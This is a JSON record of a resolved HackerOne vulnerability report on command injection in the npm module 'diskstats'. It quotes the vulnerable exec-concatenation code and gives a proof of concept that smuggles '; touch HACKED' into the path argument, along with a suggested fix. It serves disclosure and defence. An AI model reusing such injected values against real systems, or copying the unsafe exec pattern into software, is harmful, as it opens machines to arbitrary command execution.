@@ -1,0 +1,125 @@
+{
+  "id": 864354,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NjQzNTQ=",
+  "url": "https://hackerone.com/reports/864354",
+  "title": "[diskstats] Command Injection via insecure command concatenation",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-05-01T19:55:01.641Z",
+  "submitted_at": "2020-05-01T19:55:01.641Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "d3lla",
+    "url": "/d3lla",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-07-23T19:11:05.993Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-07-23T19:11:05.923Z",
+  "team_member_agreed_on_going_public_at": "2020-07-23T17:39:58.090Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report a `Command Injection` issue in the `diskstats` module.\nIt allows to execute arbitrary commands on the victim's PC.\n\n# Module\n\n**module name:** `diskstats`\n**version:** `0.0.2`\n**npm page:** `https://www.npmjs.com/package/diskstats`\n\n## Module Description\n\nThis library uses df to pull disk information such as free space & inode utilization on your system. This library only works on systems where df is installed and present within your path.\n\n## Module Stats\n\n[2] weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe issue occurs because a user input parameter is used inside a command that is executed without any check. \n\nHere's the code which causes the issue:\n\n```javascript\n// https://github.com/PhilipSkinner/diskstats/blob/master/lib/stat.js#L44\n....\nstat.prototype._fetchSpace = function(path) {\n\treturn new Promise((resolve, reject) => {\n\t\tthis.child_process.exec('df ' + this._ensureAbsPath(path), (err, stdout) => {  // <-- injection\n\t\t\tif (err) {\n\t\t\t\treturn reject(err);\n\t\t\t}\t\t\t\n\n\t\t\treturn resolve(this._parseResponse(stdout));\n\t\t});\n\t});\n};\n\n// https://github.com/PhilipSkinner/diskstats/blob/master/lib/stat.js#L56\nstat.prototype._fetchInodes = function(path) {\n\treturn new Promise((resolve, reject) => {\n\t\tthis.child_process.exec('df -i ' + this._ensureAbsPath(path), (err, stdout) => {  // <-- injection\n\t\t\tif (err) {\n\t\t\t\treturn reject(err);\n\t\t\t}\n\n\t\t\treturn resolve(this._parseResponse(stdout));\n\t\t});\n\t});\n};\n...\nmodule.exports = function(child_process, path) {\n\tif (!child_process) {\n\t\tchild_process = require('child_process');\n\t}\n\n\tif (!path) {\n\t\tpath = require('path');\n\t}\n\n\treturn new stat(child_process, path);\n}\n```\nThe `path` parameter is used to build the command that is passed to the `child_process.exec` function without any check.\n\n\n## Steps To Reproduce:\n- create a directory for testing\n    - `mkdir poc`\n    - `cd poc/`\n\n- install `diskstats` module:\n    -  `npm i diskstats`\n- create the following PoC JavaScript file (`poc.js`):\n\n```javascript\nconst diskstats = require('diskstats');\ndiskstats.check('; touch HACKED', (err, results) => {});\n\n```\n- make sure that the `HACKED` file does not exist:\n    - `ls`\n- execute the `poc.js` file:\n    - `node poc.js`\n- the `HACKED` file is created:\n    - `ls`\n    \n{F811513}\n\n\n## Patch\nDo not concatenate/format commands using insecure user's input. Always check and sanitize it. \nIn my opinion, it's better to use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) or [`child_process.spawn`](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) functions instead of `child_process.exec`.\n\n## Supporting Material/References:\n\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v14.1.0\n- NPM VERSION: 6.14.4\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nThank you for your time.\n\nbest regards,\n\nd3lla\n\n## Impact\n\nCommand Injection on `diskstats` module via insecure command concatenation.",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 811513,
+      "file_name": "poc_diskstats.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/HCrDhRL8gQT7B2u4BuZKAV4w?response-content-disposition=attachment%3B%20filename%3D%22poc_diskstats.mov%22%3B%20filename%2A%3DUTF-8%27%27poc_diskstats.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTPZNC2VJ%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151816Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB0aCXVzLXdlc3QtMiJGMEQCIGOeIibeIlvktPdkcStOSMyU%2BbReWiC5UQVnbnI09Dl6AiAO%2B%2F%2FrSMhUx9tMfmb5wIaMiLJHENuUWzc5tsWbhQc32Cq7BQjm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM7lRrW6AbiHpdNCIHKo8Fj7UpLQFh4zMnY3jGeICstGG8v%2FPO1jy3cZ6pxg2iglcoO4hdCgLoCVfjbpXEr5oH6DeQ7QumDpuR88zYEQRX1fm%2B5a5s7zZseogxgL0yPGsD276UAhyRN06IGxX8kuQh%2BS8%2FHm5f9z7oeTCH8XjMPjqVQNS5JQXHFrq3ImSipju3FjHPHHH8lNCBOLo%2FkLjPVRHEpaTUT4C%2FNPN8xP%2Bq1IUC4ag3rNUCxlPI6T7081U6GmmOK8gUJoP1uVkbAq4LQRPW7tlB1OHN1ZMTsx13xfmDOLER8E2%2FAGzzK554W6X8Ctt7ilZo1GzZgDLjYCpCt0Gnne7879XyFq1n1xiUEHT7cSwo2Y9S35ht1R%2BnJQylPDRQPphpn%2B7O5KNquVqyorZm7H%2FJFNJ5Ia3P3Syy7ah5dPmvGzqOfLotWR%2BquHdXEOL2ImRrgO6Z7%2BU4d47EhdzaLDYS9f1AgftmrmfftYclEqPtKDJArjzwPLWgMfCchojdpYtq1lOrhkgR4cBYtNgz%2BjyoUtgmeQxR5NjLYRVURU96cLCpxfy69b90xiFVDxhiraDaNPrVm6GfVYzhOsd0XEYeLtrYo54dM0cH9kXYhpRv5Ju5EzVwA7Nv%2ByP9lkkh1XU64ar4vmguOsqeVElLDV8X7xz%2B3TODfas0HHViY%2FtdeZSEB99TwyrDaKSFmbqSUiaeLR3j78MN9FwFy6utGKRqvIe8L6dudilN6I8H5K8tZlrN9k320He41mPkysTJj9wP6S5YhlhUejzYfKszsitH%2BbLBuwS%2FnQbw2UKB7vFLB1B%2Bafnq7YdvxYO2%2BJNsKbTacfDyLuQQYFx5hBXBs9hgXGzuqRH7dvZOM%2FdtByRIyRLdJYhcVPVSxTDHz%2FzPBjqyAcY36EefNEghHwns%2Fo6uJ3AEdiibcs%2BhCBgAk%2B3aIepi4wvsnI7yj8jFI89K%2F22lH6wMbBDrmUekh0364CYpSweyTZtj1SD%2BHzwcBIRjsrqIDgyK6fHWvErhgkfhGFwVAQKLKHroZA1yYxJP22Ym86HUnEl1CLH6oUILUz%2Fus2VgH4vR%2FLgGUvteZpqXMlTlBo0bspGXBzMaA4sNGBThC6dWB6rZjuarVh7e5e%2BEy1DaGn8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=19e24437ac6856dc0e1392db265e033432d2efe8e0a1321c2b92a29894d52310",
+      "file_size": 894699,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-08-22T17:39:58.162Z",
+  "allow_singular_disclosure_after": -180221898.73827568,
+  "singular_disclosure_allowed": true,
+  "vote_count": 2,
+  "voters": [
+    "bl4de",
+    "l3ftr4ru"
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 2986,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "Other module",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
